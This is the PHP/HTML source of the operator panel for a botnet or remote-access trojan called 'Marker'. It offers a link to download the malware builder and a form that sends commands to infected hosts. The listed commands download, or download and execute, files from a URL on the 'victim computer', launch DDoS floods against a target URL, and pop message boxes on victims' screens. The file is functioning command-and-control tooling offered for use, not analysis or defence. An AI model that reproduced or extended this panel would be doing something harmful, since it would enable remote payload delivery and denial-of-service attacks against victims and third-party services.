<?php
session_start();
include('api/api.php');
if (isset($_SESSION['csrftoken'])) {
    if (check_login($_SESSION['csrftoken']) == false) { header('location: index.php'); }
} else { header('location: index.php'); }
if (!isset($_GET['m'])) { header('location: panel.php'); }
?>
<html>
    <head>
        <title>Marker - Panel</title>
        <meta charset="utf-8">
        <meta name="robots" content="noodp"/>
        <meta property="og:locale" content="ar_AR" />
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta http-equiv="X-UA-Compatible" content="IE=8" />
        <meta name="theme-color" content="#cccccc" />
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="Content-Script-Type" content="text/javascript" />
        <link type="text/css" rel="stylesheet" href="style.css">
        <script src="linked/a5794e9cdf.js"></script>
        <script src="linked/jquert-3.2.1.min.js"></script>
    </head>
    <body>
        <section class="head">
            <a href="panel.php">Home</a>
            <a href="setting.php">Setting</a>
            <a href="blacklist.php">Black List</a>
            <a href="api/builder.rar">Donwload Builder</a>
            <a href="logout.php">Logout</a>
        </section><br>
        <?php if (isset($_GET['err'])) { ?> <section style="color: red; padding: 10px; text-align: center;">Wrong Command Line , Try one from list.</section> <?php } ?>
        <section class="send">
            <form method="post" action="api/sendcommand.php">
                <input type="hidden" name="md5ip" value="<?php echo htmlspecialchars($_GET['m']); ?>">
                <h>Command Line: </h><br>
                <input type="text" name="command" placeholder="write your command here ..">
                <input type="submit" name="submit" value="Send">
            </form>
        </section>
        <section class="info">
            <h><i class="fa fa-info-circle" aria-hidden="true"></i> Command Line List :</h>
            <ul>
                <li>download</li>
                <table style="width: 100%; font-size: 13; text-align: left; background: rgba(230,230,230,0.5); border-radius: 5px; padding: 5px;">
                    <tr>
                        <th>Description</th>
                        <th style="text-align: right;">Example</th>
                    </tr>
                    <tr style="color: #2b4675;">
                        <th>To download file in victim computer <h style="color: red;">` TEMP PATH `</h></th>
                        <th style="text-align: right;">download(http://www.example.com/server.exe)</th>
                    </tr>
                </table>
                <br>
                <li>downloadrun</li>
                <table style="width: 100%; font-size: 13; text-align: left; background: rgba(230,230,230,0.5); border-radius: 5px; padding: 5px;">
                    <tr>
                        <th>Description</th>
                        <th style="text-align: right;">Example</th>
                    </tr>
                    <tr style="color: #2b4675;">
                        <th>To download file in victim computer and execute it <h style="color: red;">` TEMP PATH `</h></th>
                        <th style="text-align: right;">downloadrun(http://www.example.com/server.exe)</th>
                    </tr>
                </table>
                <br>
                <li>ddos</li>
                <table style="width: 100%; font-size: 13; text-align: left; background: rgba(230,230,230,0.5); border-radius: 5px; padding: 5px;">
                    <tr>
                        <th>Description</th>
                        <th style="text-align: right;">Example</th>
                    </tr>
                    <tr style="color: #2b4675;">
                        <th>To make online service unavailable <h style="color: red;">` 10000 ATT `</h></th>
                        <th style="text-align: right;">ddos(http://www.example.com)</th>
                    </tr>
                </table>
                <br>
                <li>msgbox</li>
                <table style="width: 100%; font-size: 13; text-align: left; background: rgba(230,230,230,0.5); border-radius: 5px; padding: 5px;">
                    <tr>
                        <th>Description</th>
                        <th style="text-align: right;">Example</th>
                    </tr>
                    <tr style="color: #2b4675;">
                        <th>To send message box to victim : <h style="color: red;">msgbox(body,title)</h></th>
                        <th style="text-align: right;">msgbox(test,test)</th>
                    </tr>
                </table>
            </ul>
        </section>
    </body>
</html>